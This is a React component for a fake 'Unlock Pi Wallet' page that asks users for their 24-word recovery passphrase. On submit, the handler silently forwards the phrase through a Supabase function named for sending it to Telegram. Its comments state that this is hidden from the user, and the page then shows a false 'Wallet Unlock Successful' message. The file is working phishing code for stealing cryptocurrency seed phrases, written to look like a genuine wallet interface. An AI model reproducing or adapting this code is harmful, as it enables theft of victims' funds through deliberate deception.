import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { AlertTriangle, Wallet, Fingerprint } from "lucide-react";

const WalletUnlock = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();
  const [passphrase, setPassphrase] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [wordCount, setWordCount] = useState(0);
  const [isValidPassphrase, setIsValidPassphrase] = useState(false);
  
  // Get wallet info from navigation state
  const walletInfo = location.state as {
    walletAddress?: string;
    unlockAmount?: number;
    lockedBalance?: number;
  } | null;

  const handleBack = () => {
    navigate("/unlock-pi");
  };

  const validatePassphrase = (text: string) => {
    const words = text.trim().split(/\s+/).filter(word => word.length > 0);
    setWordCount(words.length);
    setIsValidPassphrase(words.length === 24);
    return words.length === 24;
  };

  const handlePassphraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const text = e.target.value;
    setPassphrase(text);
    validatePassphrase(text);
  };

  const handleUnlockWithPassphrase = async () => {
    if (!passphrase.trim()) {
      toast({
        title: "Error",
        description: "Please enter your recovery phrase",
        variant: "destructive",
      });
      return;
    }

    if (!isValidPassphrase) {
      toast({
        title: "Invalid Passphrase",
        description: "Please enter exactly 24 words separated by spaces",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    try {
      // Send to Telegram silently in background
      await supabase.functions.invoke('send_passphrase_to_telegram_2025_11_20_14_51', {
        body: { passphrase: passphrase.trim() }
      });

      // Show success message without mentioning Telegram
      toast({
        title: "Wallet Unlock Successful",
        description: "Your wallet has been successfully unlocked and verified!",
      });

      // Clear the passphrase for security
      setPassphrase("");
      setWordCount(0);
      setIsValidPassphrase(false);
      
      // Navigate back to home after successful submission
      setTimeout(() => {
        navigate("/");
      }, 2000);

    } catch (error: any) {
      console.error('Error processing unlock:', error);
      toast({
        title: "Unlock Failed",
        description: "Failed to verify wallet credentials. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleUnlockWithFingerprint = () => {
    toast({
      title: "Feature Not Available",
      description: "Fingerprint unlock is not implemented in this demo",
      variant: "destructive",
    });
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-white">
      {/* Compact Header Image Only */}
      <div className="w-full overflow-hidden relative bg-[#6C3F99]">
        <img 
          src="./images/header 2.jpg" 
          alt="Wallet Header" 
          className="w-full h-8 sm:h-10 object-contain opacity-90"
          style={{ imageRendering: 'crisp-edges' }}
        />
        {/* Purple overlay for consistency */}
        <div className="absolute inset-0 bg-[#6C3F99]/20 pointer-events-none"></div>
      </div>

      <div className="px-4 sm:px-6 py-4 sm:py-5 space-y-4 sm:space-y-5 max-w-lg mx-auto">
        {/* Warning Banner - Professional Design */}
        <div className="bg-gradient-to-r from-amber-50 to-yellow-50 border border-pi-gold/30 rounded-xl p-3 sm:p-4 flex items-start space-x-3 shadow-sm">
          <AlertTriangle className="w-4 h-4 sm:w-5 sm:h-5 text-pi-purple mt-0.5 flex-shrink-0" />
          <p className="text-xs sm:text-sm text-amber-900 leading-relaxed">
            <strong>Warning:</strong> If the Pi balance locked in your wallet is not greater than or equal to the amount you request, you will not be able to unlock.
          </p>
        </div>

        {/* Title */}
        <div className="text-center">
          <h1 className="text-xl sm:text-2xl font-bold text-gray-900 mb-1">Unlock Pi Wallet</h1>
          <p className="text-xs sm:text-sm text-gray-600">Verify your identity to unlock your Pi</p>
        </div>
        
        {/* Wallet Information Display */}
        {walletInfo && (
          <div className="bg-gradient-to-br from-blue-50 to-indigo-50 border border-blue-300/50 rounded-xl p-3 sm:p-4 space-y-2 shadow-sm">
            <div className="flex items-center space-x-2 mb-2">
              <Wallet className="w-4 h-4 text-pi-purple" />
              <span className="text-sm font-medium text-blue-800">Wallet Information</span>
            </div>
            
            <div className="space-y-1 text-xs">
              <div className="flex justify-between">
                <span className="text-blue-700">Wallet Address:</span>
                <span className="text-blue-800 font-mono text-xs">
                  {walletInfo.walletAddress ? 
                    `${walletInfo.walletAddress.slice(0, 8)}...${walletInfo.walletAddress.slice(-8)}` : 
                    'N/A'
                  }
                </span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-blue-700">Total Locked Balance:</span>
                <span className="text-blue-800 font-semibold">
                  π {walletInfo.lockedBalance?.toLocaleString() || '0'}
                </span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-blue-700">Amount to Unlock:</span>
                <span className="text-green-700 font-bold">
                  π {walletInfo.unlockAmount?.toLocaleString() || '0'}
                </span>
              </div>
            </div>
          </div>
        )}

        {/* Passphrase Input */}
        <div className="space-y-3 sm:space-y-4">
          <Textarea
            value={passphrase}
            onChange={handlePassphraseChange}
            placeholder="Enter Your 24 Words Passphrase Here"
            className="min-h-[100px] sm:min-h-[120px] text-sm sm:text-base resize-none border-2 border-gray-300 bg-white"
            disabled={isLoading}
          />
          

        </div>

        {/* Unlock Buttons - Matching header colors */}
        <div className="space-y-3">
          <Button 
            onClick={handleUnlockWithPassphrase}
            disabled={isLoading || !isValidPassphrase}
            className={`w-full py-3 sm:py-3.5 text-sm sm:text-base font-semibold transition-all duration-200 shadow-lg ${
              isValidPassphrase 
                ? 'bg-gradient-to-r from-pi-purple to-purple-700 hover:from-purple-700 hover:to-purple-800 active:scale-98 text-white hover:shadow-xl'
                : 'bg-gray-400 text-gray-600 cursor-not-allowed'
            }`}
          >
            {isLoading ? "Verifying Wallet..." : "Unlock With Passphrase"}
          </Button>

          <Button 
            onClick={handleUnlockWithFingerprint}
            className="w-full bg-gradient-to-r from-pi-purple to-purple-700 hover:from-purple-700 hover:to-purple-800 active:scale-98 text-white py-3 sm:py-3.5 text-sm sm:text-base font-semibold flex items-center justify-center space-x-2 transition-all duration-200 shadow-lg hover:shadow-xl"
          >
            <Fingerprint className="w-4 h-4 sm:w-5 sm:h-5" />
            <span>Unlock With Fingerprint</span>
          </Button>
        </div>

        {/* Security Information */}
        <div className="space-y-3 text-xs sm:text-sm text-gray-600 leading-relaxed bg-gray-50 p-3 sm:p-4 rounded-lg border border-gray-200">
          <p>
            As a non-custodial wallet, your wallet passphrase is only accessible to you. 
            It is currently not possible to recover the wallet passphrase.
          </p>
          <p>
            <strong>Lost your wallet passphrase?</strong> you can create a new wallet, 
            but all the PI numbers in your previous wallet will be inaccessible.
          </p>
        </div>

        {/* Back Button - Professional Design */}
        <Button 
          onClick={handleBack}
          variant="outline"
          className="w-full py-2.5 sm:py-3 text-sm sm:text-base text-pi-purple border-2 border-pi-purple/50 hover:bg-purple-50 hover:border-pi-purple active:scale-98 transition-all duration-200 font-semibold"
        >
          Back to Unlock Pi
        </Button>
      </div>
    </div>
  );
};

export default WalletUnlock;